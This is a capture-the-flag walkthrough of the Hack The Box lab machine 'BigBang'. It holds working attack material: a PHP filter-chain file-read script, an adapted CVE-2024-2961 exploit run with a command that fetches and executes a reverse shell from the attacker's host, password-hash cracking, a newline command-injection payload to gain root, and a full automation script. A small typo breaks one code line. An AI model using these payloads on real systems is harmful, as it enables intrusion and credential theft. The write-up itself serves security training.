---
icon: explosion
---

# HTB-BIG BANG

<figure><img src="../../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

Machine info

BigBang is a challenging Linux-based machine on Hack The Box, designed to test advanced exploitation skills. It involves exploiting a PHP vulnerability (CVE-2024-2961) through a complex chain of heap manipulation and encoding techniques to achieve remote code execution. The machine also features an OS command injection vulnerability that can be leveraged to escalate privileges and gain root access.

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

<figure><img src="../../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

```
Discovered open port 22/tcp on 10.10.11.52
Discovered open port 80/tcp on 10.10.11.52

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBET3VRLx4oR61tt3uTowkXZzNICnY44UpSL7zW4DLrn576oycUCy2Tvbu7bRvjjkUAjg4G080jxHLRJGI4NJoWQ=
|   256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbYOg6bg7lmU60H4seqYXpE3APnWEqfJwg1ojft/DPI
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
Running: Linux 4.X|5.X
```

### Web Enumeration

* Visiting `http://10.10.11.52` redirects to `http://blog.bigbang.htb/`
* `/etc/hosts` updated:/code

<figure><img src="../../../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

Found

```
wp-content             
wp-includes
wp-admin  
Wordpress CMS identified, the version seems to be 6.5.4 
```

Now we Run wpscan to identifies eventual wordpress realted vulnerabilities

<figure><img src="../../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

That version should be vulnerable to [CVE-2023-26326](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8) and allows the upload of arbitrary files as long as they have a valid PNG signature (`GIF89a`). Trying the commands from the blog post, generating a _malicious_ PHAR file and uploading works.

```python
$ cat evil.php
<?php  
  
class Evil{  
  public function __wakeup() : void {  
    die("Arbitrary Deserialization");  
  }  
}  
  
  
//create new Phar  
$phar = new Phar('evil.phar');  
$phar->startBuffering();  
$phar->addFromString('test.txt', 'text');  
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");  
  
// add object of any class as meta data  
$object = new Evil();  
$phar->setMetadata($object);  
$phar->stopBuffering();
 
$ php --define phar.readonly=0 evil.php
```

The server responds with JSON containing the URL of the uploaded file in the `response` key. Unfortunately the `phar://` wrapper seems to be disabled or otherwise patched, so exploiting the application as seen in the blog post is **not** possible.

```python
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/x-www-form-urlencoded; 
Content-Length: 91
action=upload_image_from_url&url=http://10.10.10.10/evil.phar&id=1&accepted_files=image/gif
```

Trying to _upload_ any other file only works as long as it’s detected as a PNG file, so theoretically I could read any _accessible_ file as long it conforms to this restriction.

With some `php://filter` magic any input can be prefixed with arbitrary values<sup>1</sup>. A small tool called [wrapwrap](https://github.com/ambionics/wrapwrap) makes this pretty straight-forward. It takes a file, a prefix, a suffix and the number of bytes to dump as parameters and generates a filter chain that produces the desired results.

```
$ python wrapwrap.py /etc/passwd 'GIF89a' '' 100000
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
 
$ cat chain.txt
php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passw
```

Using the tool to read `/etc/passwd` returns a link to the _PNG_ file containing the contents of the passwd file. It’s obviously prefixed with `GIF89a` and it does miss the very last byte but this should be sufficient to read files on the host.

<figure><img src="../../../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

Since it’s a multi-step process, I decide to write a small Python script to automate them. It runs in a loop, asks for the file path and then retrieves the contents from the server. Optionally the path can be prefixed with `dump:` to write the file contents to disk instead of printing them.

`read_files.py`

```python
import requests
 
SESSION = requests.Session()
# SESSION.proxies = {'http': 'http://127.0.0.1:8080'}
FILTER = 'php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.
iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.icon
v.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decod
e|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.ic
onv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.bas
e64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.ba
se64-decode/resource='
 
 
def read_file(path, dump=False):
    print(f'[!] Reading {path}')
    data = {'id': 1,
            'accepted_files': 'image/gif',
            'action': 'upload_image_from_url',
            'url': FILTER + path}
 
    resp = SESSION.post('http://blog.bigbang.htb/wp-admin/admin-ajax.php',
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        data={
                            'id': 1,
                            'accepted_files': 'image/gif',
                            'action': 'upload_image_from_url',
                            'url': FILTER + path},
                        ).json()
 
    upload = resp.get('response', '')
 
    if not upload or 'File type' in upload:
        print('[!] Error')
        return
 
    print(f'[!] Moved file to {upload}')
 
    resp = SESSION.get(upload)
 
    if dump:
        # Write response to a file
        filename = path.split('/')[-1]
        with open(filename, 'wb') as f:
            # Files are missing bytes...
            f.write(resp.content[6:] + b'\0' * 7)
            print(f'[!] Written {f.tell()} bytes to {filename}')
    else:
        print(resp.text[6:])
 
 
def main():
    while True:
        try:
            f = input('> ')
            read_file(f.removeprefix('dump:'), dump=f.startswith('dump:'))
        except (KeyboardInterrupt, EOFError):
            break
 
 
if __name__ == '__main__':
    main()
```

Unfortunately none of the files available to me provide any leads. During the search for exploits in **BuddyForms** another [blog post](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html) turned up, showing an alternate approach to turn the CVE into a RCE without relying on the deserialisation. **CVE-2024-2961** is actually a bug in **glibc** that can be triggered by using filter chains.

The blog post is from the same people that made **wrapwrap** and they provide a [PoC](https://github.com/ambionics/cnext-exploits/) for this vulnerability as well. It needs to be adjusted to the web application running on `blog.bigbang.htb`.

Most of the code can be recycled from the `read_files.py` script. Additionally the `self.check_vulnerable()` in the `run` method has to be commented out, because the missing byte at the end the read files makes the check fail.

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#
 
from __future__ import annotations
 
import base64
import urllib
import zlib
 
from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError
 
from pwn import *
from ten import *
 
 
HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")
 
 
class Remote:
    """A helper class to send the payload and download files.
 
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
 
    The code here serves as an example that attacks a page that looks like:
 
    Tweak it to fit your target, and start the exploit.
    """
    FILTER = 'php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='
 
    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()
 
    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        if path.startswith('php://'):
            p = urllib.parse.quote_plus(path)
        else:
            p = self.FILTER + path
 
        data = {'id': 1,
            'accepted_files': 'image/gif',
            'action': 'upload_image_from_url',
            'url': p}
        resp = self.session.post(self.url,
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                 data=data).json()
        return self.session.get(resp['response'])
 
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        resp = self.send(path)
        return resp.content[6:] + b'\0' * 7yyy
```

Running the script with the URL of the vulnerable endpoint and the command to `curl` my web server downloads the memory map from `/proc/self/maps` and the `libc` file used by the application. Then it calculates the necessary filter chain and sends it to the endpoint. This generates a hit on my server.

```python
$ python cnext-exploit.py  "http://blog.bigbang.htb/wp-admin/admin-ajax.php" "curl http://10.10.10.10"
--- SNIP ---
 
$ python cnext-exploit.py  "http://blog.bigbang.htb/wp-admin/admin-ajax.php" "curl http://10.10.14.110/shell|bash"
[*] Potential heaps: 0x7f8295e00040, 0x7f8295c00040, 0x7f8294800040, 0x7f8292000040, 0x7f8291800040, 0x7f8290c00040 (using first)
[*] Heap address: 0x7f8295e00040
 
     EXPLOIT  SUCCESS 
```

I follow that up with command that retrieves a file with a reverse shell and executes it. This way I get a callback as `www-data` and I’m dropped into `/var/www/html/wordpress/wp-admin` within a **Docker** container.

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

### Shell as Shawking

Here’s a simple explanation of that step:

* You are running as **www-data** (the web server user).
* You can access the **WordPress configuration file** (`wp-config.php`).
* That file contains the **database credentials** (username and password).
* With these credentials, you can connect to the **WordPress database**, which may allow further enumeration or exploitation.

```python
<?php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
 
/** Database username */
define( 'DB_USER', 'wp_user' );
 
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
 
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
 
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
 
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Since the Docker container lacks the `mysql` client, I download **Chisel** on my host to create a **SOCKS proxy**. Using this proxy, I connect to the MySQL database on `172.17.0.1` with the credentials found in the WordPress configuration. Inspecting the `wp_users` table reveals only two entries: `root` and `shawking`.

```python
$ proxychains -q mysql -h 172.17.0.1 \
                       -u wp_user \
                       -p'wp_password' \
                       -D wordpress \
                       --skip-ssl-verify-server-cert
 
MySQL [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.028 sec)
 
MySQL [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name    |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
|  1 | root       | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 | root          | root@bigbang.htb     | http://blog.bigbang.htb | 2024-05-31 13:06:58 |                     |           0 | root            |
|  3 | shawking   | $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ | shawking      | shawking@bigbang.htb |                         | 2024-06-01 10:39:55 |                     |           0 | Stephen Hawking |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
2 rows in set (0.022 sec)
```

The hash for `shawking` cracks rather fast and returns `quantumphysics` as the clear text password. Those credentials allow me to login via **SSH** and collect the first flag.

```
$ hashcat -m 400 '$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./' /usr/share/wordlists/rockyou.txt
--- SNIP ---
$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics
--- SNIP ---
```

### Shell as Developer

User shawking is not able to run anything with sudo but listing the processes shows Grafana is running in another Docker container.

```python
$ ps -ewwo user,pid,ppid,cmd
USER         PID    PPID CMD
--- SNIP ---
root        1419    1166 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.17.0.2 -container-port 80
root        1424    1166 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.17.0.2 -container-port 80
root        1444       1 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 8e3a72b5e980ad947d6353b65ba227a3267ad600819617b1f1d980bdc0f2da5f -address /run/containerd/containerd.sock
root        1468    1444 apache2 -DFOREGROUND
root        1512    1166 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.3 -container-port 3000
root        1534       1 /usr/bin/containerd-shim-runc-v2 -namespace moby -id de64f0959084f468309ffd4cf39b3c1d53a354848190509888302eeacbd14a18 -address /run/containerd/containerd.sock
root        1555    1534 grafana server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
root        1591    1166 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 3306 -container-ip 172.17.0.4 -container-port 3306
--- SNIP ---
```

Looking around on the host there’s a file called `grafana.db` in `/opt/data`, likely the database in use. Once again the system is lacking the needed binaries to read the (**SQLite3**) database, so I transfer the file to my host via **scp**. There I can find two more users with their password hash and the salted used to generate it.

```python
$ scp shawking@bigbang.htb:/opt/data/grafana.db .
 
$ sqlite3 grafana.db
sqlite> .tables
alert                        library_element_connection 
alert_configuration          login_attempt              
alert_configuration_history  migration_log              
alert_image                  ngalert_configuration      
alert_instance               org                        
alert_notification           org_user                   
alert_notification_state     permission                 
alert_rule                   playlist                   
alert_rule_tag               playlist_item              
alert_rule_version           plugin_setting             
annotation                   preferences                
annotation_tag               provenance_type            
anon_device                  query_history              
api_key                      query_history_star         
builtin_role                 quota                      
cache_data                   role                       
cloud_migration              secrets                    
cloud_migration_run          seed_assignment            
correlation                  server_lock                
dashboard                    session                    
dashboard_acl                short_url                  
dashboard_provisioning       signing_key                
dashboard_public             sso_setting                
dashboard_snapshot           star                       
dashboard_tag                tag                        
dashboard_version            team                       
data_keys                    team_member                
data_source                  team_role                  
entity_event                 temp_user                  
file                         test_data                  
file_meta                    user                       
folder                       user_auth                  
kv_store                     user_auth_token            
library_element              user_role
 
sqlite> select login,password,salt from user;
admin|441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34|CFn7zMsQpf
developer|7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960|4umebBJucv
```

**Grafana** uses PBKDF2 with SHA256 and 10000 iterations<sup>2</sup>. **Hashcat** mode `10900` wants the following format:

```python
sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
sha256:<iterations>:<base64 encoded salt>:<base64 encoded hash>
```

The salt is stored as string but the password hash as hex, so this one has to be [decoded](https://gchq.github.io/CyberChef/#recipe=From_Hex\('Auto'\)To_Base64\('A-Za-z0-9%2B/%3D'\)\&input=N2U4MDE4YTQyMTBlZmJhZWIxMmYwMTE1NTgwYTQ3NmZlOGY5OGE0ZjliYWRhMjcyMGU2NTI2NTQ4NjBjNTlkYjkzNTc3YjEyMjAxYzAxNTEyNTYzNzVkNmY4ODNmMWI4ZDk2MA) first. Encoding both values as base64 and using `10000` iterations results in the following line that **hashcat** takes as input and cracks after a few seconds.

```
$ cat hash
sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=
 
$ hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
--- SNIP ---
sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:bigbang
--- SNIP ---
```

### Shell as Root

After changing to the user `developer` I find an **Android** app in `~/android` and I grab this file with **scp**.

```
$ ls -la ~/android
total 2424
drwxrwxr-x 2 developer developer    4096 Jun  7  2024 .
drwxr-x--- 4 developer developer    4096 Jan 17 11:38 ..
-rw-rw-r-- 1 developer developer 2470974 Jun  7  2024 satellite-app.apk
```

Loading the **APK** file into [jadx-gui](https://github.com/skylot/jadx) decompiles the code into a readable format. Searching the code base for `bigbang.htb` shows multiple hits. Apparently the app communicates with `http://app.bigbang.htb:9090` and there are at least two endpoints, `/login` and `/command`.

<figure><img src="../../../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

Trying to access `http://127.0.0.1:9090/login` from the target complains about missing parameters in the JSON data. Adding the credentials for the `developer` account returns an `access_token`.

```python
$ curl -X POST http://127.0.0.1:9090/login \
       -H "Content-Type: application/json" \
       -H "Accept: application/json" \
       -H "Host: app.bigbang.htb" \
       -d {}
{"error":"Missing username or password"}
 
$ curl -X POST http://127.0.0.1:9090/login \
       -H "Content-Type: application/json" \
       -H "Accept: application/json" \
       -H "Host: app.bigbang.htb" \
       -d '{"username": "developer", "password": "bigbang"}'
{"access_token":"eyJ0<REDACTED>o8"}
```

The same trick unfortunately does not work for the `/command` endpoint and the error messages does not list the expected parameters.

```python
$ export ACCESS_TOKEN=eyJ0<REDACTED>o8
 
$ curl -X POST http://127.0.0.1:9090/command \
       -H "Content-Type: application/json" \
       -H "Accept: application/json" \
       -H "Host: app.bigbang.htb" \
       -H "Authorization: Bearer ${ACCESS_TOKEN}" \
       -d '{}'
{"error":"Invalid command"}
```

Searching the code base again for `/command` returns another snippet that documents the necessary parameters for the endpoint. The command `send_image` is hardcoded but `output_file` is a user-controlled string.

<figure><img src="../../../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

Providing a dummy `output_file` prints a rather general error. Then I check for command injection by using a new-line (`\n`) followed by a sleep command. Timing the execution shows the delay so my input is passed to a shell eventually.

```python
$ export ACCESS_TOKEN=eyJ0<REDACTED>o8
 
$ curl -X POST http://127.0.0.1:9090/command \
       -H "Content-Type: application/json" \
       -H "Accept: application/json" \
       -H "Host: app.bigbang.htb" \
       -H "Authorization: Bearer ${ACCESS_TOKEN}" \
       -d '{"command": "send_image", "output_file": "/tmp/test.png"}'
{"error":"Error generating image: "}
 
$ time curl -X POST http://127.0.0.1:9090/command \
       -H "Content-Type: application/json" \
       -H "Accept: application/json" \
       -H "Host: app.bigbang.htb" \
       -H "Authorization: Bearer ${ACCESS_TOKEN}" \
       -d '{"command": "send_image", "output_file": "/tmp/test.png\nsleep 5"}'
{"error":"Error reading image file: [Errno 2] No such file or directory: '/tmp/test.png\\nsleep 5'"}
 
real    0m5.027s
user    0m0.004s
sys     0m0.008s
```

I place a simple reverse shell into `/tmp/shell` and repeat the previous command with `\nbash /tmp/shell` as input and get a shell as `root`.

```
$ curl -X POST http://127.0.0.1:9090/command \
       -H "Content-Type: application/json" \
       -H "Accept: application/json" \
       -H "Host: app.bigbang.htb" \
       -H "Authorization: Bearer ${ACCESS_TOKEN}" \
       -d '{"command": "send_image", "output_file": "/tmp/test.png\nbash /tmp/shell"}'
# Hangs...
```

### Automation Script

```python
import paramiko
import re
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Ensure blog.bigbang.htb is in /etc/hosts
TARGET_IP = "blog.bigbang.htb"

SHAWKING_USER = "shawking"
SHAWKING_PASS = "quantumphysics"

DEVELOPER_USER = "developer"
DEVELOPER_PASS = "bigbang"

def print_status(message):
    print(f"{Fore.CYAN}[INFO] {Style.RESET_ALL}{message}")

def print_success(message):
    print(f"{Fore.GREEN}[+] {Style.RESET_ALL}{message}")

def print_error(message):
    print(f"{Fore.RED}[ERROR] {Style.RESET_ALL}{message}")

def ssh_connect(username, password, command):
    """Establish an SSH connection and execute a command."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(TARGET_IP, username=username, password=password)

        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        
        client.close()
        return output
    except Exception as e:
        print_error(f"SSH connection failed: {e}")
        return None

def retrieve_user_flag():
    """Retrieve and print the /home/shawking/user.txt flag."""
    print_status("Connecting to shawking via SSH...")
    flag = ssh_connect(SHAWKING_USER, SHAWKING_PASS, "cat /home/shawking/user.txt")
    if flag:
        print_success(f"User flag: {Fore.YELLOW}{flag}")
    else:
        print_error("Failed to retrieve user flag.")

def get_bearer_token_via_ssh():
    """SSH into developer and extract the Bearer token using the login command."""
    print_status("Logging into developer via SSH to retrieve Bearer token...")

    ssh_command = (
        "curl -s -X POST -H 'Content-Type: application/json' "
        "-d '{\"username\":\"developer\", \"password\":\"bigbang\"}' "
        "http://localhost:9090/login | grep -oP '\"access_token\":\"\\K[^\"]+'"
    )

    token = ssh_connect(DEVELOPER_USER, DEVELOPER_PASS, ssh_command)

    if token:
        print_success(f"Bearer Token: {Fore.YELLOW}{token}")
        return token.strip()
    else:
        print_error("Failed to retrieve Bearer token.")
        return None

def execute_root_exploit_via_ssh(bearer_token):
    """Use the Bearer token to copy /root/root.txt to /home/developer/pwned.txt via SSH."""
    print_status("Sending payload to copy root.txt to pwned.txt...")

    exploit_command = (
        f'curl -s -X POST "http://127.0.0.1:9090/command" '
        f'-H "Authorization: Bearer {bearer_token}" '
        f'-H "Content-Type: application/json" '
        f"--data '{{\"command\":\"send_image\", \"output_file\":\"\\ncp --no-preserve=mode,ownership /root/root.txt /home/developer/pwned.txt\"}}'"
    )

    ssh_connect(DEVELOPER_USER, DEVELOPER_PASS, exploit_command)
    print_success("Exploit executed, checking pwned.txt...")

def read_and_delete_pwned():
    """Read and print the root flag from pwned.txt, then delete it."""
    print_status("Reading pwned.txt...")
    root_flag = ssh_connect(DEVELOPER_USER, DEVELOPER_PASS, "cat /home/developer/pwned.txt")

    if root_flag:
        print_success(f"Root flag: {Fore.YELLOW}{root_flag}")
        print_status("Deleting pwned.txt to clean up...")
        ssh_connect(DEVELOPER_USER, DEVELOPER_PASS, "rm /home/developer/pwned.txt")
    else:
        print_error("Root flag not found.")

if __name__ == "__main__":
    retrieve_user_flag()
    bearer_token = get_bearer_token_via_ssh()
    if bearer_token:
        execute_root_exploit_via_ssh(bearer_token)
        read_and_delete_pwned()

```

<figure><img src="../../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
